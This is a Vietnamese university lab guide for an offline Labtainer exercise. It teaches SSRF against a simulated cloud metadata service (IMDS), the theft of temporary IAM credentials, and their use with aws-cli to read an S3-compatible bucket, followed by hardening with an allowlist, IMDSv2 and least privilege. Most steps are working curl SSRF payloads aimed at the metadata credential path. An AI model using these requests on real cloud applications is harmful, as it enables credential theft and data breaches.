# Học viện Công nghệ Bưu chính Viễn thông - SecLab PTIT
## HƯỚNG DẪN THỰC HÀNH

# Khai thác SSRF để đánh cắp Cloud Credential qua Metadata Service (IMDS)

**Mức độ:** Nâng cao  **|**  **Phân loại:** Cloud Security / DevSecOps  **|**  **Ánh xạ khung:** OWASP Top 10 A10:2021 (SSRF) · MITRE ATT&CK T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)

---

## 1. Giới thiệu lab

| Thông tin | Chi tiết |
|---|---|
| **Tên Lab** | `cloud-ssrf-imds` |
| **Mức độ** | Nâng cao |
| **Công cụ sử dụng** | `curl`, `jq`, `aws-cli` (v2), ứng dụng web mục tiêu (chức năng "xem trước ảnh theo URL") |
| **Kiến thức yêu cầu** | Hiểu cơ bản về HTTP request/response và tham số URL; biết dùng terminal Linux và `curl`; khái niệm cơ bản về dịch vụ đám mây (IAM role, object storage kiểu S3). Tất cả khái niệm cốt lõi được nhắc lại trong mục 3 nên **không yêu cầu đã làm bài lab nào trước đó**. |

**Mục tiêu học tập**
- Hiểu bản chất lỗ hổng **SSRF (Server-Side Request Forgery)** và vì sao nó đặc biệt nguy hiểm trong môi trường đám mây.
- Nắm được vai trò của dịch vụ **Instance Metadata Service (IMDS)** và cơ chế cấp **credential tạm thời** cho IAM role gắn với máy chủ.
- Hiểu chuỗi tấn công điển hình của sự cố **Capital One (2019)**: SSRF → IMDS → credential tạm thời → truy cập trái phép object storage.
- Nắm nguyên tắc phòng thủ nhiều lớp: chống SSRF (allowlist, chặn IP nội bộ/link-local), **IMDSv2** (yêu cầu token qua PUT, giới hạn hop limit), và **least privilege** cho IAM role.
- Ánh xạ kỹ thuật khai thác vào OWASP A10 và MITRE ATT&CK T1552.005.

**Kỹ năng đạt được**
- Kỹ năng phát hiện và xác nhận (verify) một điểm SSRF trong chức năng "fetch URL" của ứng dụng web.
- Kỹ năng lợi dụng SSRF để pivot tới các dịch vụ chỉ nghe trên mạng nội bộ mà attacker không truy cập trực tiếp được.
- Kỹ năng trích xuất và sử dụng credential tạm thời (AccessKey/SecretKey/SessionToken) để thao tác với object storage tương thích S3 bằng `aws-cli`.
- Kỹ năng viết hardening chống SSRF (validate & allowlist URL, chặn dải link-local/metadata) và cấu hình phòng thủ tầng metadata (IMDSv2, hop limit).
- Kỹ năng đánh giá rủi ro theo tư duy DevSecOps: tìm nguyên nhân gốc rễ và đề xuất phòng thủ theo chiều sâu.

---

## 2. Kịch bản

**Tình huống:**
Một công ty tài chính vận hành ứng dụng web `imgproxy-portal` cho phép người dùng dán một URL ảnh để hệ thống tải về và tạo bản xem trước (preview). Ứng dụng này chạy trên một "máy chủ đám mây" được gắn một IAM role có quyền đọc trên một bucket object storage nội bộ. Do chức năng "fetch URL" không kiểm tra đích đến, ứng dụng có thể bị ép gửi request tới bất kỳ địa chỉ nội bộ nào — bao gồm cả dịch vụ metadata của đám mây.

Sinh viên đóng vai **attacker** đã tiếp cận được giao diện ứng dụng web (qua máy `client`), nhưng **không** có quyền truy cập trực tiếp tới dịch vụ metadata hay object storage nội bộ. Mục tiêu là khai thác SSRF để buộc chính máy chủ web gọi tới IMDS giả, đọc credential tạm thời của IAM role, rồi dùng credential đó để truy cập bucket và lấy **flag**.

> **Lưu ý mô phỏng offline:** Toàn bộ lab chạy cục bộ trong Labtainer, **KHÔNG có cloud thật**. Dịch vụ IMDS được **giả lập** bằng một HTTP server nội bộ (`imds`) phục vụ các đường dẫn kiểu `/latest/meta-data/...` giống hệt IMDS thật, và trả về credential **giả**. Địa chỉ thật của IMDS trên cloud là `169.254.169.254`; trong môi trường lab, đường dẫn ổn định để dùng là **tên `imds`**. Object storage đích được mô phỏng bằng **MinIO** (tương thích S3). Mọi khóa/token đều là dữ liệu giả dùng cho mục đích học tập.

**Vai trò của sinh viên:**
1. Trên máy `client`, khảo sát chức năng "fetch URL" của ứng dụng web mục tiêu và **phát hiện SSRF**.
2. Dùng SSRF để ép máy chủ web truy vấn IMDS giả, liệt kê IAM role và đọc credential tạm thời (AccessKeyId/SecretAccessKey/Token).
3. Cấu hình `aws-cli` với credential vừa lấy, trỏ `--endpoint-url` tới object storage mô phỏng, liệt kê bucket và **tải về flag**.
4. Thực hiện **hardening**: bật allowlist chống SSRF cho webapp, bật IMDSv2 cho tầng metadata, và đề xuất least privilege; xác minh các biện pháp có hiệu lực.

**Sơ đồ mạng (mô tả text):**

```
                    Mang ao Labtainer LAB_NET 172.34.0.0/24
  +--------------------------------------------------------------------+
  |                                                                    |
  |   [client]  172.34.0.10  (TERMINALS: co shell)                     |
  |   Attacker: curl, jq, aws-cli                                      |
  |      |                                                             |
  |      | (1) HTTP toi chuc nang "fetch URL"                          |
  |      v                                                             |
  |   [web]  172.34.0.20  (cong 8080, KHONG co shell cho SV)           |
  |   Ung dung "imgproxy-portal" DINH SSRF                             |
  |   Duoc gan IAM role: web-imgproxy-role                             |
  |      |                          |                                  |
  |      | (2) SSRF ep server goi   | (4) client dung credential       |
  |      |     toi IMDS gia         |     truy cap truc tiep storage   |
  |      v                          v                                  |
  |   [imds] 172.34.0.40         [storage] 172.34.0.30 (cong 9000)     |
  |   (mo phong 169.254.169.254)  MinIO (S3-compatible)                |
  |   /latest/meta-data/...      bucket: fin-reports (chua flag)       |
  |   tra credential tam thoi     KHONG co shell cho SV                |
  |   KHONG co shell cho SV                                            |
  |                                                                    |
  +--------------------------------------------------------------------+

  Luong tan cong:  client --SSRF--> web --(goi ho)--> imds
                   client lay credential tu phan hoi cua web
                   client --aws-cli + credential--> storage --> FLAG

  Ghi chu: [imds] CHI chap nhan request /latest/meta-data/... di ra tu
           [web] (giong dung tinh chat that cua IMDS: chi may gan role moi
           doc duoc metadata cua chinh no). client KHONG the doc thang
           metadata cua imds - bat buoc phai di qua SSRF cua web.
```

---

## 3. Kiến thức bổ trợ

**Kiến thức nền tảng**

- **SSRF (Server-Side Request Forgery) — OWASP A10:2021:** lỗ hổng khi ứng dụng nhận một URL/đường dẫn từ người dùng và **tự mình** gửi request tới đó mà không kiểm soát đích. Kẻ tấn công lợi dụng để buộc server gọi tới tài nguyên nội bộ (localhost, mạng riêng, dịch vụ metadata) mà bản thân họ không tiếp cận được từ bên ngoài. Server trở thành "proxy" tin cậy trong mạng nội bộ.

- **Instance Metadata Service (IMDS):** dịch vụ đặc biệt trên các nền tảng đám mây, truy cập được từ *bên trong* máy ảo qua địa chỉ **link-local `169.254.169.254`**. Nó cung cấp metadata về máy (region, hostname, network...) và — quan trọng nhất về an ninh — **credential tạm thời của IAM role** gắn với máy tại đường dẫn `/latest/meta-data/iam/security-credentials/<tên-role>`. Bất kỳ tiến trình nào chạy trên máy (kể cả một ứng dụng bị SSRF) đều có thể đọc được credential này.

- **IAM role & credential tạm thời:** thay vì nhúng khóa cứng vào ứng dụng, đám mây cấp cho máy một *role* và IMDS phát hành khóa tạm thời gồm `AccessKeyId`, `SecretAccessKey`, `Token` (session token) có thời hạn. Ai lấy được bộ ba này sẽ mạo danh được role trong thời gian token còn hiệu lực.

- **IMDSv1 vs IMDSv2:** IMDSv1 trả credential chỉ với một request `GET` đơn giản → rất dễ bị SSRF khai thác. **IMDSv2** yêu cầu quy trình 2 bước: gửi `PUT` để lấy **session token**, rồi mọi request `GET` phải kèm header token đó; đồng thời áp **hop limit** (thường = 1) để gói tin có TTL nhỏ không đi qua proxy/chuyển tiếp. Điều này khiến phần lớn SSRF cổ điển (chỉ làm được `GET` đơn giản, không tạo được `PUT` hay gắn header tùy ý) thất bại.

- **Object storage tương thích S3 (MinIO):** dịch vụ lưu trữ đối tượng theo mô hình *bucket/object*, dùng chung giao thức và cú pháp với Amazon S3, xác thực request bằng chữ ký (SigV4) từ cặp AccessKey/SecretKey. `aws-cli` có thể thao tác với MinIO bằng tham số `--endpoint-url` trỏ tới địa chỉ MinIO cục bộ.

- **Sự cố Capital One (2019):** minh họa kinh điển cho chuỗi này — một ứng dụng dính SSRF bị ép gọi IMDS, kẻ tấn công lấy credential tạm thời của role rồi đọc dữ liệu hàng trăm triệu khách hàng trên S3. Nguyên nhân gốc: SSRF + IMDSv1 + role quyền quá rộng.

- **Least privilege:** nguyên tắc chỉ cấp cho role đúng quyền tối thiểu cần thiết. Nếu role của ứng dụng preview ảnh chỉ cần đọc một bucket cụ thể, việc gán quyền rộng sẽ biến một SSRF thành thảm họa dữ liệu.

**Thành phần cần quan sát trong bài lab**

| Thành phần | Vai trò |
|---|---|
| Chức năng "fetch URL" (`/fetch?url=...`) của `web` | Điểm nhập tham số URL do người dùng kiểm soát; là bề mặt tấn công SSRF. |
| Dịch vụ `imds` (mô phỏng `169.254.169.254`) | Đích SSRF quan trọng; phục vụ metadata và credential tạm thời của role. Chỉ nhận request từ `web`. |
| Đường dẫn `/latest/meta-data/iam/security-credentials/` | Liệt kê tên IAM role gắn với máy; nối thêm tên role sẽ trả về credential JSON. |
| Bộ credential tạm thời (AccessKeyId/SecretAccessKey/Token) | "Chìa khóa" tạm thời để mạo danh role truy cập object storage. |
| Bucket `fin-reports` trên `storage` (MinIO) | Tài nguyên đích, private; chứa đối tượng `flag.txt`. |
| Công tắc quản trị `/admin/harden` (trên `web`) và `/admin/enable-imdsv2`, `/admin/imdsv2-demo` (trên `imds`) | Cơ chế lab dùng để sinh viên áp dụng và kiểm chứng hardening mà không cần SSH/shell vào các máy dịch vụ. |

**Bảng công cụ & cú pháp**

| Công cụ | Tùy chọn / Cú pháp | Mô tả tác dụng |
|---|---|---|
| `curl` | `curl -s "http://web:8080/fetch?url=<URL_ĐÍCH>"` | Gửi request tới chức năng fetch URL; đặt `<URL_ĐÍCH>` là địa chỉ nội bộ để kiểm tra/khai thác SSRF. |
| `curl` | `curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"` | Ép server đi qua SSRF để truy vấn IMDS giả (khai thác chính). |
| `curl \| jq` | `curl -s ... \| jq .` | Kết hợp với `jq` để định dạng/parse phản hồi JSON credential. |
| `jq` | `jq -r '.AccessKeyId, .SecretAccessKey, .Token'` | Trích riêng từng trường credential từ JSON để cấu hình aws-cli. |
| `export` | `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...` | Nạp credential tạm thời qua biến môi trường cho aws-cli. |
| `aws-cli` | `aws --endpoint-url http://storage:9000 s3 ls` | Liệt kê bucket trên object storage mô phỏng (MinIO). |
| `aws-cli` | `aws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ./flag.txt` | Tải đối tượng `flag.txt` từ bucket về máy. |
| `curl -X POST` | `curl -s -X POST http://imds/admin/enable-imdsv2` | (Nhiệm vụ 4) Bật chế độ IMDSv2 trên dịch vụ metadata giả. |
| `curl -X POST` | `curl -s -X POST http://web:8080/admin/harden` | (Nhiệm vụ 4) Áp dụng bản vá chống SSRF (allowlist + chặn CIDR nội bộ) cho webapp. |
| `curl` | `curl -s http://imds/admin/imdsv2-demo \| jq .` | (Nhiệm vụ 4) Xem minh họa quy trình IMDSv2 hợp lệ (PUT lấy token → GET kèm token). |

---

## 4. Các nhiệm vụ của bài thực hành

Để tải bài thực hành, sinh viên thực hiện câu lệnh:

```bash
imodule https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule/cloud-ssrf-imds.tar
```

Để khởi động bài thực hành, sinh viên dùng câu lệnh:

```bash
labtainer cloud-ssrf-imds
```

> Chú ý: sinh viên sử dụng mã sinh viên của mình để nhập thông tin email người thực hiện bài lab khi có yêu cầu, để sử dụng khi chấm điểm.

Sau khi khởi động xong, một terminal ảo sẽ xuất hiện, đại diện cho máy tấn công: `client`. Trong mạng lab, có thể dùng trực tiếp tên `web`, `imds`, `storage` (đã cấu hình sẵn trong `/etc/hosts`) thay cho địa chỉ IP.

---

### Nhiệm vụ 1 — `discover_ssrf`: Phát hiện và xác nhận lỗ hổng SSRF

**Mục tiêu:** Khảo sát chức năng "fetch URL" của ứng dụng web và chứng minh rằng server có thể bị ép gửi request tới đích do attacker chỉ định (bao gồm cả tài nguyên nội bộ mà `client` không truy cập trực tiếp được).

**Bước 1:** Xem trang chính để hiểu chức năng fetch/preview:
```bash
curl -s "http://web:8080/" | head -n 40
```

**Bước 2:** Gọi thử chức năng fetch với một URL hợp lệ để quan sát hành vi "server tải hộ":
```bash
curl -s "http://web:8080/fetch?url=http://web:8080/health"
```

**Bước 3:** Xác nhận SSRF hướng nội bộ — ép server tự gọi tới loopback của chính nó (đích mà `client` không thể gọi thay được):
```bash
curl -s "http://web:8080/fetch?url=http://127.0.0.1:8080/health"
```

**Bước 4:** Thử trỏ tới dịch vụ metadata nội bộ (mô phỏng `169.254.169.254`) để kiểm tra khả năng pivot:
```bash
curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"
```
So sánh với việc `client` thử gọi thẳng `imds` (không qua `web`) — dịch vụ metadata sẽ từ chối vì không đến từ `web`:
```bash
curl -s -i "http://imds/latest/meta-data/"
```

**Điều kiện hoàn thành nhiệm vụ:** Request qua tham số `url` tới đích nội bộ (loopback của webapp và/hoặc dịch vụ metadata `imds`) trả về nội dung hợp lệ do *server* lấy hộ, chứng minh chức năng fetch bị SSRF. (Chấm tự động: nhật ký nội bộ của `web` ghi nhận request outbound thành công tới đích nội bộ, xuất phát từ chức năng fetch.)

**Câu hỏi 1:** Vì sao việc server "tải hộ" một URL nội bộ (ví dụ loopback của chính nó, hay địa chỉ IMDS) lại nguy hiểm hơn nhiều so với việc chính attacker tự gọi các địa chỉ đó từ máy `client`?
Trả lời: _______________________________________

---

### Nhiệm vụ 2 — `steal_credentials`: Khai thác SSRF để đọc IMDS và đánh cắp credential tạm thời

**Mục tiêu:** Dùng SSRF làm cầu nối tới IMDS giả, liệt kê IAM role gắn với máy chủ web và trích xuất bộ credential tạm thời của role đó.

**Bước 1:** Liệt kê danh mục metadata gốc để xác nhận cấu trúc IMDS:
```bash
curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"
```

**Bước 2:** Truy vấn danh sách IAM role gắn với instance (đường dẫn này trả về *tên role*):
```bash
curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/"
```
Ghi lại tên role thu được (ví dụ: `web-imgproxy-role`).

**Bước 3:** Nối tên role vào đường dẫn để lấy credential tạm thời dạng JSON, và lưu lại vào file `~/creds.txt`:
```bash
curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/<TÊN_ROLE>" | tee ~/creds.txt
```

**Bước 4:** Parse JSON để tách các trường credential:
```bash
cat ~/creds.txt | jq .
```
Xác định 3 trường: `AccessKeyId`, `SecretAccessKey`, `Token`.

**Điều kiện hoàn thành nhiệm vụ:** Trích xuất thành công bộ credential tạm thời (đủ 3 trường) của IAM role qua kênh SSRF → IMDS, và lưu vào `~/creds.txt`. (Chấm tự động: nhật ký nội bộ của `web` xác nhận đã thực sự gọi được đường dẫn `security-credentials` qua SSRF; `~/creds.txt` trên `client` chứa trường `AccessKeyId`.)

**Câu hỏi 2:** Kỹ thuật này ánh xạ tới MITRE ATT&CK **T1552.005 (Unsecured Credentials: Cloud Instance Metadata API)**. Vì sao credential lấy từ IMDS được coi là "credential tạm thời" và điều đó ảnh hưởng thế nào tới cách attacker phải hành động sau khi đánh cắp?
Trả lời: _______________________________________

---

### Nhiệm vụ 3 — `access_storage_get_flag`: Dùng credential đánh cắp để truy cập object storage và lấy flag

**Mục tiêu:** Cấu hình `aws-cli` bằng credential tạm thời vừa lấy, trỏ tới object storage mô phỏng (MinIO), liệt kê bucket và tải về `flag.txt`.

**Bước 1:** Nạp credential qua biến môi trường (lấy giá trị từ `~/creds.txt`). Object storage mô phỏng (MinIO) chỉ cần cặp AccessKeyId/SecretAccessKey; trường `Token` của IMDS là giá trị mô phỏng, **không** nạp vào `AWS_SESSION_TOKEN` (MinIO sẽ từ chối yêu cầu mang token không hợp lệ):
```bash
export AWS_ACCESS_KEY_ID=<AccessKeyId>
export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
unset AWS_SESSION_TOKEN
export AWS_DEFAULT_REGION=us-east-1
```

**Bước 2:** Liệt kê các bucket mà role có quyền nhìn thấy trên object storage mô phỏng:
```bash
aws --endpoint-url http://storage:9000 s3 ls
```

**Bước 3:** Liệt kê nội dung bucket mục tiêu để tìm tập tin flag:
```bash
aws --endpoint-url http://storage:9000 s3 ls s3://fin-reports/
```

**Bước 4:** Tải về `flag.txt`, đọc nội dung, và lưu vào file `~/loot.txt` (chỉ chứa đúng nội dung flag):
```bash
aws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ./flag.txt
cat ./flag.txt
cp ./flag.txt ~/loot.txt
```

**Điều kiện hoàn thành nhiệm vụ:** Dùng credential đánh cắp truy cập được bucket `fin-reports` và tải về `flag.txt`; nội dung `~/loot.txt` trùng khớp với flag cá nhân hóa của bài. (Chấm tự động: so khớp chính xác nội dung `~/loot.txt` với flag được sinh riêng cho từng sinh viên — không thể đoán hay sao chép của người khác.)

**Câu hỏi 3:** Trình bày lại toàn bộ chuỗi khai thác từ Nhiệm vụ 1 đến đây (SSRF → IMDS → credential → storage). So sánh với sự cố Capital One 2019: điểm tương đồng cốt lõi là gì?
Trả lời: _______________________________________

---

### Nhiệm vụ 4 — `harden_ssrf_imds`: Phòng thủ nhiều lớp (chống SSRF, IMDSv2, least privilege)

**Mục tiêu:** Áp dụng tư duy DevSecOps để bịt lỗ hổng theo chiều sâu: bật IMDSv2 cho tầng metadata, bật allowlist chống SSRF cho webapp, và đề xuất least privilege cho IAM role; sau đó xác minh các biện pháp có hiệu lực.

> **Lưu ý:** Trong bài lab này, `web` và `imds` không cấp shell/SSH cho sinh viên (mô phỏng đúng thực tế: các dịch vụ production thường được vá qua pipeline/kênh quản trị, không phải SSH thủ công). Vì vậy các thao tác hardening dưới đây được thực hiện bằng cách gọi các endpoint quản trị qua `curl` trực tiếp từ `client`.

**Bước 1 — Bật IMDSv2 trên dịch vụ metadata (yêu cầu token qua PUT, hop limit mô phỏng):**
```bash
curl -s -X POST http://imds/admin/enable-imdsv2
```

**Bước 2 — Xác minh: chuỗi khai thác SSRF cổ điển của Nhiệm vụ 2 giờ bị IMDSv2 chặn** (chức năng fetch của webapp chỉ làm được `GET` đơn giản, không tạo được `PUT` hay gắn header token tùy ý):
```bash
curl -s -i "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/<TÊN_ROLE>"
```
Kỳ vọng: HTTP 401, không còn `AccessKeyId` trong phản hồi.

**Bước 3 — Xem minh họa quy trình IMDSv2 hợp lệ** (PUT lấy token → GET kèm token, thực hiện đúng cách từ "chính instance"), để xác nhận IMDSv2 không làm hỏng use-case hợp lệ, chỉ chặn SSRF cổ điển:
```bash
curl -s http://imds/admin/imdsv2-demo | jq .
```

**Bước 4 — Bật allowlist chống SSRF ở tầng ứng dụng webapp** (allowlist host + chặn mọi đích phân giải ra dải nội bộ/link-local: `127.0.0.0/8`, `169.254.0.0/16` — đặc biệt `169.254.169.254` — `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`):
```bash
curl -s -X POST http://web:8080/admin/harden
```

**Bước 5 — Xác minh SSRF đã bị chặn hoàn toàn ở tầng ứng dụng:**
```bash
curl -s -i "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/<TÊN_ROLE>"
```
Kỳ vọng: HTTP 403 "blocked host".

**Bước 6 — Least privilege (mô tả & ghi nhận):** Viết vào file `~/remediation.txt` trên `client` phần trả lời ngắn, nêu đủ 3 lớp phòng thủ:
```bash
cat > ~/remediation.txt <<'EOF'
1. Chong SSRF: allowlist host + chan CIDR noi bo/link-local (169.254.169.254).
2. IMDSv2: bat buoc token PUT, hop limit = 1.
3. Least privilege: role chi s3:GetObject tren prefix cu the, khong list/ghi toan bucket.
EOF
```

**Điều kiện hoàn thành nhiệm vụ:** (a) Sau khi bật IMDSv2, chuỗi SSRF cổ điển (`GET` trần qua fetch) bị từ chối (không còn `AccessKeyId`) trong khi quy trình PUT→GET hợp lệ vẫn hoạt động đúng; (b) sau khi bật allowlist trên webapp, request SSRF tới `imds` bị chặn hoàn toàn ở tầng ứng dụng; (c) `~/remediation.txt` nêu đủ 3 từ khóa: allowlist, IMDSv2, least privilege.

**Câu hỏi 4:** Trong ba biện pháp trên, nếu chỉ được chọn triển khai **một** để giảm rủi ro tức thời cho chuỗi tấn công này, sinh viên chọn biện pháp nào và vì sao? Biện pháp nào là "phòng thủ theo chiều sâu" bổ trợ khi biện pháp kia thất bại?
Trả lời: _______________________________________

---

## 5. Ánh xạ khung tham chiếu

- **OWASP Top 10 A10:2021** — Server-Side Request Forgery (SSRF).
- **MITRE ATT&CK T1552.005** — Unsecured Credentials: Cloud Instance Metadata API.
- **Tham chiếu thực tế** — sự cố rò rỉ dữ liệu Capital One (2019), một trong những minh họa kinh điển nhất cho chuỗi SSRF → IMDS → credential tạm thời → truy cập trái phép object storage.
